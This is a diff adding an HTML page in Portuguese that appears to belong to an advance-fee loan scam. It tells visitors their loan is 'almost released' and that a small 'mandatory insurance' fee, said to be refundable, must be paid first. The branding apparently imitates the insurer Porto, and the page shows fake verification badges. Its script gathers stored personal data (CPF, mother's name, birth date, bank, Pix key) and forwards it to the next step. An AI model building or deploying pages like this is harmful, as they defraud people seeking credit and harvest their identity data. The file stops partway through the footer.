@@ -1,0 +1,579 @@
+﻿<!DOCTYPE html><html lang="pt-BR">
+<head>
+  <script src="../js/utm.js"></script>
+<script src="../js/tracking.js"></script>
+<script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async="" defer=""></script>
+  <meta charset="utf-8">
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Seguro Prestamista</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&amp;family=Hind+Siliguri:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
+  <script src="../../fluxo.js"></script>
+  <style>
+    :root {
+      --primary: #0099FF; --primary-deep: #0A0047; --primary-light: #fef0e4; --primary-subtle: #F8F8F8;
+      --accent: #0099FF; --accent-yellow: #0099FF; --accent-gold: #0066CC;
+      --green: #22c55e; --green-dark: #16a34a; --green-soft: #dcfce7; --green-light: #f0fdf4; --green-border: #bbf7d0;
+      --hero-bg: #0099FF; --hero-deep: #0066CC;
+      --bg: #F5F5F5; --card: #FFFFFF; --text: #111827; --text-mid: #374151; --text-light: #0099FF;
+      --border: #E5E7EB; --danger: #ef4444; --radius: 16px;
+      --shadow: 0 4px 24px rgba(0,0,0,.06), 0 1px 2px rgba(0,0,0,.04);
+      --shadow-lg: 0 8px 32px rgba(0,0,0,0.1);
+      font-family: 'Hind Siliguri', sans-serif;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+    body { background: var(--bg); color: var(--text); -webkit-font-smoothing: antialiased; min-height: 100vh; display: flex; flex-direction: column; }
+
+    /* HEADER */
+    header.header { display: none; }
+    .m2-header{background:#F0F8FF;padding:22px 24px 0;position:relative;overflow:hidden;border-bottom:3px solid #0099FF;}
+    .m2-header::before{content:'';position:absolute;top:-40%;right:-20%;width:280px;height:280px;background:radial-gradient(circle,rgba(0,153,255,0.10) 0%,transparent 70%);pointer-events:none;}
+    .m2-header-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:18px;}
+    .m2-brand{display:flex;align-items:center;}
+    .m2-brand img{height:38px;width:auto;max-width:160px;display:block;}
+    .m2-policy-label{font-size:10px;color:#0A0047;font-family:'JetBrains Mono',monospace;text-align:right;font-weight:600;}
+    .m2-policy-num{font-size:15px;font-weight:800;color:#0A0047;text-align:right;}
+    .m2-info-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;background:#E6F4FF;border-radius:12px;padding:14px 16px;margin-bottom:18px;border:2px solid #0099FF;}
+    .m2-info-label{font-size:10px;color:#0A0047;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:4px;font-weight:700;}
+    .m2-info-value{font-size:14px;font-weight:700;color:#0066CC;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+    .header-content { padding: 0 20px; display: flex; align-items: center; justify-content: space-between; gap: 16px; max-width: 550px; margin: 0 auto; }
+    .header-left { display: flex; align-items: center; gap: 14px; }
+    .menu-icon { width: 40px; height: 40px; background: #F3F4F6; border-radius: 12px; display: flex; align-items: center; justify-content: center; cursor: pointer; border: 1px solid var(--border); }
+    .menu-icon svg { width: 18px; height: 18px; color: var(--primary); stroke-width: 2.5; }
+    .header-logo { height: 36px; width: auto; }
+    .header-right { display: flex; align-items: center; gap: 10px; }
+    .user-info { display: flex; flex-direction: column; align-items: flex-end; gap: 1px; }
+    .user-name { font-size: 13px; font-weight: 600; color: var(--text); max-width: 120px; text-overflow: ellipsis; overflow: hidden; white-space: nowrap; }
+    .user-cpf { font-size: 11px; color: #0099FF; letter-spacing: 0.3px; }
+    .user-icon-wrapper { width: 40px; height: 40px; background: var(--primary-light); border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 2px solid var(--primary); color: var(--primary); }
+    .user-icon-wrapper svg { width: 20px; height: 20px; color: var(--primary); }
+
+    /* HERO */
+    .hero { background: transparent; padding: 0 0 22px; position: relative; overflow: hidden; }
+    .hero::before { display: none; }
+    .hero-badge { display: inline-flex; align-items: center; gap: 8px; background: #0099FF; border: 1px solid #0099FF; border-radius: 20px; padding: 5px 14px; margin-bottom: 14px; }
+    .hero-badge-bar { display: none; }
+    .hero-badge-text { font-size: 0.72rem; font-weight: 700; letter-spacing: 1.2px; text-transform: uppercase; color: #FFFFFF; }
+    .hero-title { font-family:'Hind Siliguri','Poppins', sans-serif; font-size: 1.45rem; font-weight: 800; color: #0099FF; line-height: 1.25; letter-spacing: -0.3px; margin-bottom: 10px; }
+    .hero-title .hl { color: #0A0047; }
+    .hero-sub { font-size: 0.88rem; color: #0099FF; font-weight: 500; line-height: 1.5; margin-bottom: 0; }
+    .hero-sub strong { color: #0099FF; font-weight: 700; }
+
+    .hero-badges { display: flex; gap: 0; border-top: 1px solid #0099FF; margin: 16px -24px 0; }
+    .hero-badges-item { flex: 1; text-align: center; padding: 12px 8px; font-size: 0.62rem; font-weight: 700; letter-spacing: 0.8px; text-transform: uppercase; color: #0099FF; border-right: 1px solid #0099FF; }
+    .hero-badges-item:last-child { border-right: none; }
+
+    /* MAIN */
+    .main-container { flex: 1; display: flex; align-items: flex-start; justify-content: center; padding: 20px; }
+    .container { width: 100%; max-width: 480px; }
+
+    /* TITLE */
+    .page-title { font-family:'Hind Siliguri','Poppins', sans-serif; font-size: 1.12rem; font-weight: 800; color: var(--text); line-height: 1.3; letter-spacing: -0.3px; margin-bottom: 6px; }
+    .page-title .hl { color: var(--primary); }
+    .page-sub { font-size: 0.88rem; color: #0099FF; line-height: 1.5; margin-bottom: 20px; }
+
+    /* VALOR APROVADO */
+    .approved-card { background: none; border: none; border-radius: 0; padding: 0; display: flex; align-items: center; justify-content: space-between; margin-bottom: 18px; }
+    .approved-left { display: flex; align-items: center; gap: 8px; }
+    .approved-left svg { width: 16px; height: 16px; color: #0099FF; }
+    .approved-label { font-size: 0.8rem; font-weight: 600; color: #0099FF; }
+    .approved-right { text-align: right; }
+    .approved-value { font-family:'Hind Siliguri','Poppins', sans-serif; font-size: 1.4rem; font-weight: 800; color: var(--green); line-height: 1.1; letter-spacing: -0.3px; }
+    .approved-installments { font-size: 0.75rem; font-weight: 600; color: #0099FF; margin-top: 2px; }
+
+    /* VIDEO */
+    .video-wrapper { position: relative; border-radius: var(--radius); overflow: hidden; margin-bottom: 18px; cursor: pointer; box-shadow: var(--shadow); background: #000; }
+    .video-wrapper video { width: 100%; display: block; }
+    .sound-overlay { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; background: rgba(0,0,0,0.22); transition: opacity 0.4s ease; z-index: 10; }
+    .sound-overlay.hidden { opacity: 0; pointer-events: none; }
+    .sound-btn { display: inline-flex; align-items: center; gap: 8px; background: #0099FF; color: #FFFFFF; border: none; padding: 12px 20px; border-radius: 999px; font-family: 'Hind Siliguri', sans-serif; font-size: 0.9rem; font-weight: 700; cursor: pointer; box-shadow: 0 4px 18px rgba(0,0,0,0.45); }
+    .sound-btn svg { width: 18px; height: 18px; }
+
+    /* CARD */
+    .card { background: var(--card); border-radius: var(--radius); box-shadow: var(--shadow); padding: 20px; border: 1px solid var(--border); margin-bottom: 16px; }
+
+    /* SEGURO SECTION */
+    .seguro-section { margin-bottom: 16px; }
+    .seguro-section-title { font-family:'Hind Siliguri','Poppins', sans-serif; font-size: 0.95rem; font-weight: 800; color: var(--primary); line-height: 1.2; margin-bottom: 12px; }
+
+    /* BENEFIT ITEMS */
+    .benefit-items { display: flex; flex-direction: column; gap: 0; }
+    .benefit-item { display: flex; align-items: center; gap: 10px; padding: 10px 0; border-bottom: 1px solid #F0F1F3; }
+    .benefit-item:last-child { border-bottom: none; padding-bottom: 0; }
+    .benefit-item:first-child { padding-top: 0; }
+    .benefit-icon { width: 28px; height: 28px; min-width: 28px; background: var(--green-soft); border-radius: 8px; display: flex; align-items: center; justify-content: center; }
+    .benefit-icon svg { width: 14px; height: 14px; color: var(--green); stroke-width: 2.5; }
+    .benefit-text { font-size: 0.82rem; font-weight: 600; color: var(--text); line-height: 1.3; }
+
+    /* COTAÇÃO */
+    .cotacao-title { font-family:'Hind Siliguri','Poppins', sans-serif; font-size: 1.2rem; font-weight: 800; color: var(--primary); margin-bottom: 4px; }
+    .cotacao-sub { font-size: 0.82rem; color: #0099FF; line-height: 1.45; margin-bottom: 14px; }
+    .cotacao-options { display: flex; flex-direction: column; gap: 10px; margin-bottom: 16px; }
+    .cotacao-opt { display: flex; align-items: center; gap: 12px; border: 1.5px solid var(--border); border-radius: 12px; padding: 14px; cursor: pointer; transition: all 0.2s; position: relative; }
+    .cotacao-opt.selected { border-color: var(--accent); background: rgba(0,153,255,0.04); box-shadow: 0 0 0 1px var(--accent); }
+    .cotacao-radio { width: 20px; height: 20px; min-width: 20px; border-radius: 50%; border: 2px solid var(--border); display: flex; align-items: center; justify-content: center; transition: all 0.2s; }
+    .cotacao-opt.selected .cotacao-radio { border-color: var(--accent); }
+    .cotacao-radio::after { content: ''; width: 10px; height: 10px; border-radius: 50%; background: var(--accent); transform: scale(0); transition: transform 0.2s; }
+    .cotacao-opt.selected .cotacao-radio::after { transform: scale(1); }
+    .cotacao-info { flex: 1; }
+    .cotacao-label { font-size: 0.65rem; font-weight: 700; letter-spacing: 0.8px; text-transform: uppercase; color: #0099FF; margin-bottom: 2px; }
+    .cotacao-valor { font-family:'Hind Siliguri','Poppins', sans-serif; font-size: 1.15rem; font-weight: 800; color: var(--text); line-height: 1.2; }
+    .cotacao-parcelas { font-size: 0.72rem; color: #0099FF; margin-top: 2px; }
+    .cotacao-seguro { text-align: right; min-width: 70px; }
+    .cotacao-seguro-label { font-size: 0.65rem; font-weight: 700; letter-spacing: 0.8px; text-transform: uppercase; color: #0099FF; margin-bottom: 2px; }
+    .cotacao-seguro-valor { font-family:'Hind Siliguri','Poppins', sans-serif; font-size: 1.05rem; font-weight: 800; color: var(--green); }
+    .cotacao-resumo { display: flex; flex-direction: column; gap: 8px; padding-top: 14px; border-top: 1px solid #F0F1F3; margin-bottom: 16px; }
+    .cotacao-resumo-row { display: flex; align-items: center; justify-content: space-between; }
+    .cotacao-resumo-row .cr-label { font-size: 0.85rem; color: #0099FF; font-weight: 500; }
+    .cotacao-resumo-row .cr-value { font-family:'Hind Siliguri','Poppins', sans-serif; font-size: 0.95rem; font-weight: 800; color: var(--text); }
+    .cotacao-resumo-row .cr-value.green { color: var(--green); }
+    .cotacao-note { display: flex; align-items: flex-start; gap: 8px; font-size: 0.75rem; color: #0099FF; line-height: 1.45; margin-top: 10px; }
+    .cotacao-note svg { width: 16px; height: 16px; min-width: 16px; color: #0099FF; margin-top: 1px; }
+
+    /* CTA */
+    .btn-cta { width: 100%; background: #0099FF; color: #FFFFFF; border: none; padding: 16px; border-radius: 12px; font-family:'Hind Siliguri','Poppins', sans-serif; font-size: 1rem; font-weight: 700; letter-spacing: -0.2px; cursor: pointer; transition: all 0.2s; box-shadow: 0 4px 16px rgba(0,153,255,0.35); display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 14px; }
+    .btn-cta:active { transform: scale(0.98); box-shadow: 0 2px 8px rgba(0,153,255,0.25); }
+    .btn-cta svg { width: 18px; height: 18px; }
+    @keyframes shine { 0% { left: -100%; } 100% { left: 100%; } }
+
+    /* SECURE PILL */
+    .secure-pill { display: flex; align-items: center; justify-content: center; gap: 8px; background: var(--green-light); border: 1px solid var(--green-border); color: var(--green-dark); padding: 12px; border-radius: 12px; font-size: 0.85rem; font-weight: 600; margin-bottom: 14px; }
+    .secure-pill svg { width: 16px; height: 16px; }
+
+    .final-note { text-align: center; font-size: 0.82rem; color: #0099FF; line-height: 1.55; padding: 0 8px; }
+
+
+    @media (max-width: 480px) {
+      .card { padding: 18px 16px; }
+      .hero-title { font-size: 1.5rem; }
+    }
+
+/* =================== FOOTER BOM PRA CRÉDITO =================== */
+.ss-footer{background:#F0F8FF; border-top:1px solid #E5E7EB;padding:32px 20px 24px;text-align:center;font-family:"Hind Siliguri",-apple-system,BlinkMacSystemFont,sans-serif;color:#6B7280;font-size:14px;line-height:1.6}
+.ss-footer-logo{margin-bottom:16px}
+.ss-footer-logo img{height:42px;width:auto;display:inline-block}
+.ss-footer-company{font-size:14px;font-weight:700;color:#111827;margin-bottom:4px}
+.ss-footer-addr{font-size:12px;color:#9CA3AF;margin-bottom:16px}
+.ss-footer-links{display:flex;justify-content:center;gap:8px;flex-wrap:wrap;margin-bottom:16px;padding-top:16px;border-top:1px solid #E5E7EB}
+.ss-footer-links a{color:#374151;text-decoration:none;font-size:12px;font-weight:500;cursor:pointer}
+.ss-footer-links a:hover{color:#0099FF}
+.ss-footer-links span{opacity:.4;font-size:12px}
+.ss-footer-badges{display:flex;align-items:center;justify-content:center;gap:16px;flex-wrap:wrap}
+.ss-footer-badges span{display:flex;align-items:center;gap:4px;font-size:11px;color:#6B7280;font-weight:500}
+.ss-footer-badges svg{width:14px;height:14px;color:#0A0047}
+.ss-dialog{border:0;padding:0;border-radius:20px;color:#111827;max-width:600px;width:calc(100% - 32px);box-shadow:0 20px 60px rgba(0,0,0,.2)}
+.ss-dialog::backdrop{background:rgba(0,0,0,.5);backdrop-filter:blur(4px)}
+.ss-dialog-head{display:flex;justify-content:space-between;align-items:center;padding:24px 24px 20px;border-bottom:1px solid #E5E7EB}
+.ss-dialog-head h2{font-family:"Hind Siliguri",sans-serif;font-size:20px;font-weight:700;margin:0}
+.ss-dialog-close{background:none;border:none;font-size:32px;color:#6B7280;cursor:pointer;width:36px;height:36px;display:flex;align-items:center;justify-content:center;border-radius:50%;transition:all .2s;line-height:1;padding:0}
+.ss-dialog-close:hover{background:#F3F4F6;color:#111827}
+.ss-dialog-body{padding:24px;overflow-y:auto;max-height:70vh}
+.ss-dialog-body h3{font-size:17px;font-weight:700;color:#111827;margin:24px 0 12px}
+.ss-dialog-body h3:first-child{margin-top:0}
+.ss-dialog-body p{font-size:14px;line-height:1.7;color:#6B7280;margin-bottom:16px}
+.ss-dialog-body ul{margin:12px 0 16px 20px;padding:0}
+.ss-dialog-body li{font-size:14px;line-height:1.7;color:#6B7280;margin-bottom:8px}
+.ss-contact-item{display:flex;gap:16px;align-items:flex-start;padding:20px;background:#FAFBFC;border:1px solid #E5E7EB;border-radius:16px;margin-bottom:12px}
+.ss-contact-icon{width:48px;height:48px;background:#0A0047;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.ss-contact-icon svg{color:#0099FF;width:24px;height:24px}
+.ss-contact-item h4{font-size:15px;font-weight:700;color:#111827;margin:0 0 4px}
+.ss-contact-item p{font-size:14px;color:#6B7280;margin:0}
+.ss-contact-note{margin-top:16px;padding:20px;background:#FAFBFC;border:1px solid #E5E7EB;border-radius:12px}
+.ss-contact-note p{font-size:13px;line-height:1.6;color:#374151;margin-bottom:8px}
+.ss-contact-note p:last-child{margin-bottom:0}
+.ss-contact-note strong{color:#0A0047}
+
+</style>
+</head>
+<body>
+  <!-- HEADER (estilo pagamento) -->
+  <div class="m2-header">
+    <div class="m2-header-top">
+      <div class="m2-brand">
+        <img src="../images/logo.png" alt="Porto">
+      </div>
+      <div>
+        <div class="m2-policy-label">PROTOCOLO</div>
+        <div class="m2-policy-num" id="protocolNum">#SS-0000</div>
+      </div>
+    </div>
+    <div class="m2-info-grid">
+      <div><div class="m2-info-label">Segurado</div><div class="m2-info-value" id="leadNome">Cliente</div></div>
+      <div><div class="m2-info-label">CPF</div><div class="m2-info-value" id="leadCPF">***.***.***-**</div></div>
+    </div>
+    <div class="hero" style="padding:0 0 22px;">
+      <div style="max-width:480px;">
+        <div class="hero-badge">
+          <div class="hero-badge-bar"></div>
+          <span class="hero-badge-text">Falta pouco</span>
+        </div>
+        <h1 class="hero-title">Seu empréstimo está <span class="hl">quase liberado.</span></h1>
+        <p class="hero-sub">Para liberar o Pix de <strong id="heroAmount">R$ 7.850,00</strong> na sua conta, falta apenas contratar o seguro obrigatório do crédito.</p>
+      </div>
+      <div class="hero-badges">
+        <div class="hero-badges-item">PIX<br>Autorizado</div>
+        <div class="hero-badges-item">Conta<br>Verificada</div>
+        <div class="hero-badges-item">Proteção do<br>Crédito</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="main-container">
+    <div class="container">
+
+      <!-- TITLE -->
+      <h1 class="page-title">Finalize a contratação do Seguro Prestamista</h1>
+      <p class="page-sub">Última etapa para liberação do seu crédito via PIX</p>
+
+      <!-- VALOR APROVADO -->
+      <div class="approved-card">
+        <div class="approved-left">
+          <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"></circle><path stroke-linecap="round" stroke-linejoin="round" d="M14.5 9.2c-.5-.9-1.4-1.2-2.5-1.2-1.4 0-2.5.8-2.5 1.9 0 2.6 5 1.3 5 3.9 0 1.1-1.1 1.9-2.5 1.9-1.1 0-2-.4-2.5-1.2M12 6.5v1.5m0 8v1.5"></path></svg>
+          <span class="approved-label">Valor Aprovado</span>
+        </div>
+        <div class="approved-right">
+          <div class="approved-value" id="approvedAmount">R$ 7.850,00</div>
+          <div class="approved-installments" id="installmentsText">36x de R$ 238,39</div>
+        </div>
+      </div>
+
+      <!-- VIDEO -->
+      <div class="video-wrapper" onclick="activateSound()">
+        <video id="mainVideo" src="media/presta.mp4" autoplay="" muted="" loop="" playsinline=""></video>
+        <div class="sound-overlay" id="soundOverlay">
+          <button class="sound-btn" type="button">
+            <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M15.536 8.464a5 5 0 010 7.072M17.95 6.05a8 8 0 010 11.9M5 9v6h4l5 5V4L9 9H5z"></path></svg>
+            Ativar Som
+          </button>
+        </div>
+      </div>
+
+      <!-- POR QUE O SEGURO É NECESSÁRIO -->
+      <div class="card seguro-section">
+        <div class="seguro-section-title">Por que o seguro é necessário</div>
+
+        <div class="benefit-items">
+          <div class="benefit-item">
+            <div class="benefit-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg></div>
+            <div class="benefit-text">Pix liberado na hora após o pagamento</div>
+          </div>
+          <div class="benefit-item">
+            <div class="benefit-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg></div>
+            <div class="benefit-text">Protege você e sua família em caso de imprevistos</div>
+          </div>
+          <div class="benefit-item">
+            <div class="benefit-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg></div>
+            <div class="benefit-text">100% reembolsável ao quitar o empréstimo</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- COTAÇÃO -->
+      <div class="card">
+        <div class="cotacao-title">Escolha sua cotação</div>
+        <p class="cotacao-sub">Cotações com valor extra liberam mais dinheiro na sua conta, no mesmo prazo de 36x.</p>
+
+        <div class="cotacao-options">
+          <div class="cotacao-opt" data-idx="0" onclick="selectCotacao(0)">
+            <div class="cotacao-radio"></div>
+            <div class="cotacao-info">
+              <div class="cotacao-label">Você receberá</div>
+              <div class="cotacao-valor" id="cot0valor">R$ 3.925,00</div>
+              <div class="cotacao-parcelas" id="cot0parcelas">36x de R$ 119,19 · juros 0,49% a.m.</div>
+            </div>
+            <div class="cotacao-seguro">
+              <div class="cotacao-seguro-label">Seguro</div>
+              <div class="cotacao-seguro-valor">R$ 29,90</div>
+            </div>
+          </div>
+
+          <div class="cotacao-opt selected" data-idx="1" onclick="selectCotacao(1)">
+            <div class="cotacao-radio"></div>
+            <div class="cotacao-info">
+              <div class="cotacao-label">Você receberá</div>
+              <div class="cotacao-valor" id="cot1valor">R$ 7.850,00</div>
+              <div class="cotacao-parcelas" id="cot1parcelas">36x de R$ 238,39 · juros 0,49% a.m.</div>
+            </div>
+            <div class="cotacao-seguro">
+              <div class="cotacao-seguro-label">Seguro</div>
+              <div class="cotacao-seguro-valor">R$ 36,84</div>
+            </div>
+          </div>
+
+          <div class="cotacao-opt" data-idx="2" onclick="selectCotacao(2)">
+            <div class="cotacao-radio"></div>
+            <div class="cotacao-info">
+              <div class="cotacao-label">Você receberá</div>
+              <div class="cotacao-valor" id="cot2valor">R$ 12.700,00</div>
+              <div class="cotacao-parcelas" id="cot2parcelas">36x de R$ 385,67 · juros 0,49% a.m.</div>
+            </div>
+            <div class="cotacao-seguro">
+              <div class="cotacao-seguro-label">Seguro</div>
+              <div class="cotacao-seguro-valor">R$ 46,90</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="cotacao-resumo">
+          <div class="cotacao-resumo-row">
+            <span class="cr-label">Valor do seguro a pagar</span>
+            <span class="cr-value" id="resumoSeguro">R$ 36,84</span>
+          </div>
+          <div class="cotacao-resumo-row">
+            <span class="cr-label">Você recebe via Pix</span>
+            <span class="cr-value green" id="resumoPix">R$ 7.850,00</span>
+          </div>
+        </div>
+
+        <div class="cotacao-note">
+          <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+          Pagamento único do seguro. Valor 100% reembolsável após a quitação do empréstimo, conforme cláusula do seu contrato.
+        </div>
+      </div>
+
+      <!-- CTA -->
+      <button class="btn-cta" onclick="handleRedirect()">
+        <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+        Contratar Seguro e Liberar Crédito
+      </button>
+
+      <!-- SECURE -->
+      <div class="secure-pill">
+        <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+        Ambiente seguro e criptografado
+      </div>
+
+      <p class="final-note">Após a confirmação do pagamento, o valor será liberado automaticamente via PIX em até 10 minutos.</p>
+
+    </div>
+  </div>
+
+
+  <script>
+    function formatBRL(n) { return Number(n).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' }); }
+
+    // ==================== USER DATA ====================
+    function loadUserData() {
+      var nome = localStorage.getItem('nome');
+      if (nome) {
+        var nomes = nome.trim().split(/\s+/);
+        var display = nomes.length > 1 ? nomes[0] + ' ' + nomes[nomes.length - 1] : nomes[0];
+        var el = document.getElementById('leadNome');
+        if (el) el.textContent = display;
+      }
+      var cpf = localStorage.getItem('cpf');
+      if (cpf) {
+        var cl = cpf.replace(/\D/g, '');
+        if (cl.length === 11) {
+          var masked = '***.' + cl.substring(3,6) + '.' + cl.substring(6,9) + '-**';
+          var elCpf = document.getElementById('leadCPF');
+          if (elCpf) elCpf.textContent = masked;
+          var elProto = document.getElementById('protocolNum');
+          if (elProto) elProto.textContent = '#SS-' + cl.slice(-4);
+        }
+      }
+    }
+
+    // ==================== VALORES DINÂMICOS ====================
+    function loadValues() {
+      var approvedAmount = localStorage.getItem('selectedLoanAmount');
+      var installments = localStorage.getItem('selectedInstallments');
+      var monthlyPayment = localStorage.getItem('selectedMonthlyPayment');
+
+      if (approvedAmount) {
+        var amount = parseFloat(approvedAmount);
+        var formatted = formatBRL(amount);
+        document.getElementById('heroAmount').textContent = formatted;
+        document.getElementById('approvedAmount').textContent = formatted;
+      }
+
+      if (installments && monthlyPayment) {
+        var monthly = parseFloat(monthlyPayment);
+        document.getElementById('installmentsText').textContent = installments + 'x de ' + formatBRL(monthly);
+      } else if (installments && approvedAmount) {
+        var amt = parseFloat(approvedAmount);
+        var months = parseInt(installments, 10);
+        var r = 0.0049;
+        var monthly2 = (amt * (r * Math.pow(1 + r, months))) / (Math.pow(1 + r, months) - 1);
+        document.getElementById('installmentsText').textContent = months + 'x de ' + formatBRL(monthly2);
+      }
+    }
+
+    // ==================== VÍDEO / SOM ====================
+    function activateSound() {
+      var video = document.getElementById('mainVideo');
+      video.muted = false;
+      video.currentTime = 0;
+      var p = video.play();
+      if (p && p.catch) { p.catch(function(){}); }
+      document.getElementById('soundOverlay').classList.add('hidden');
+    }
+
+
+    // ==================== REDIRECT ====================
+    function handleRedirect() {
+      var name = localStorage.getItem('nome') || '';
+      var cpf = localStorage.getItem('cpf') || '';
+      var tel = localStorage.getItem('telephone') || localStorage.getItem('telefone') || '';
+      var amount = localStorage.getItem('selectedLoanAmount') || '';
+
+      var params = new URLSearchParams();
+      params.set('name', name);
+      params.set('document', cpf);
+      params.set('telephone', tel);
+      params.set('amount', amount);
+
+      var importantParams = ['email','income','salaryDay','occupation','education','utm_source','utm_campaign','utm_medium','utm_content','utm_term','nome_mae','data_nasc','banco','chave_pix','selectedInstallments','selectedMonthlyPayment'];
+      importantParams.forEach(function(p) {
+        var v = localStorage.getItem(p);
+        if (v) params.set(p, v);
+      });
+
+      var c = cotacoes[selectedCotacao];
+      params.set('seguro_price', c.seguro.toString());
+      params.set('cotacao_index', selectedCotacao.toString());
+      params.set('loan_amount', c.valor.toString());
+
+      // Preserva click IDs (gclid, etc.) p/ não perder atribuição Google/Utmify.
+      // Só adiciona; nunca remove. Busca na URL atual e, como reserva, no que o inicio salvou.
+      (function(){
+        var CIDS = ['gclid','gbraid','wbraid','gad_source','fbclid'];
+        var url = new URLSearchParams(location.search), blob = {};
+        try { blob = JSON.parse(localStorage.getItem('gads_tracking') || localStorage.getItem('gc_pdc') || '{}'); } catch(e){}
+        CIDS.forEach(function(k){
+          var v = url.get(k) || blob[k] || localStorage.getItem(k) || '';
+          if (v) params.set(k, v);
+        });
+      })();
+
+      // Salvar opções de seguro no localStorage
+      localStorage.setItem('seguroSelecionado', JSON.stringify(cotacoes[selectedCotacao]));
+      // Usar sistema de fluxo para próximo passo
+      setTimeout(() => {
+        if(window.FLUXO && typeof FLUXO.proximoPasso === 'function') {
+          FLUXO.proximoPasso();
+        } else {
+          // Fallback caso FLUXO não esteja disponível
+          window.location.href = '../10/indexae25.html';
+        }
+      }, 500);
+    }
+
+    // ==================== COTAÇÃO ====================
+    var cotacoes = [
+      { seguro: 29.90 },
+      { seguro: 36.84 },
+      { seguro: 46.90 }
+    ];
+    var selectedCotacao = 1;
+
+    function buildCotacoes() {
+      var base = parseFloat(localStorage.getItem('approvedLoanAmount')) || parseFloat(localStorage.getItem('selectedLoanAmount')) || 7850;
+      var inst = parseInt(localStorage.getItem('selectedInstallments'), 10) || 36;
+      var r = 0.0049;
+      var valores = [base / 2, base, 12700];
+      cotacoes[0].valor = valores[0];
+      cotacoes[1].valor = valores[1];
+      cotacoes[2].valor = valores[2];
+      for (var i = 0; i < 3; i++) {
+        var v = valores[i];
+        var m = (v * (r * Math.pow(1 + r, inst))) / (Math.pow(1 + r, inst) - 1);
+        cotacoes[i].parcela = m;
+        cotacoes[i].inst = inst;
+        var elV = document.getElementById('cot' + i + 'valor');
+        var elP = document.getElementById('cot' + i + 'parcelas');
+        if (elV) elV.textContent = formatBRL(v);
+        if (elP) elP.textContent = inst + 'x de ' + formatBRL(m) + ' · juros 0,49% a.m.';
+      }
+      updateResumo();
+    }
+
+    function selectCotacao(idx) {
+      selectedCotacao = idx;
+      document.querySelectorAll('.cotacao-opt').forEach(function(el, i) {
+        el.classList.toggle('selected', i === idx);
+      });
+      updateResumo();
+    }
+
+    function updateResumo() {
+      var c = cotacoes[selectedCotacao];
+      document.getElementById('resumoSeguro').textContent = formatBRL(c.seguro);
+      document.getElementById('resumoPix').textContent = formatBRL(c.valor);
+      localStorage.setItem('selectedSeguroPrice', c.seguro.toString());
+      localStorage.setItem('selectedCotacaoIndex', selectedCotacao.toString());
+      localStorage.setItem('selectedLoanAmount', c.valor.toString());
+    }
+
+    // ==================== INIT ====================
+    document.addEventListener('DOMContentLoaded', function() {
+      loadUserData();
+      loadValues();
+      buildCotacoes();
+    });
+  </script>
+
+<!-- FOOTER BOM PRA CRÉDITO -->
+<footer class="ss-footer">
+  <div class="ss-footer-logo"><img src="../images/logo.png" alt="Porto"></div>
+  <p class="ss-footer-company">&copy; 2026 Pagamentos S.A &ndash; Instituição de Pagamento.</p>
+  <p class="ss-footer-addr">São Paulo, SP &ndash; CEP 05409-000</p>
+  <div class="ss-footer-links">
+    <a onclick="document.getElementById('ss-termos').showModal();return false;">Termos de Uso</a><span>&bull;</span>
+    <a onclick="document.getElementById('ss-privacidade').showModal();return false;">Política de Privacidade</a><span>&bull;</span>
+    <a onclick="document.getElementById('ss-contato').showModal();return false;">Contato</a>
+  </div>
+  <div class="ss-footer-badges">
+    <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>SSL Seguro</span>
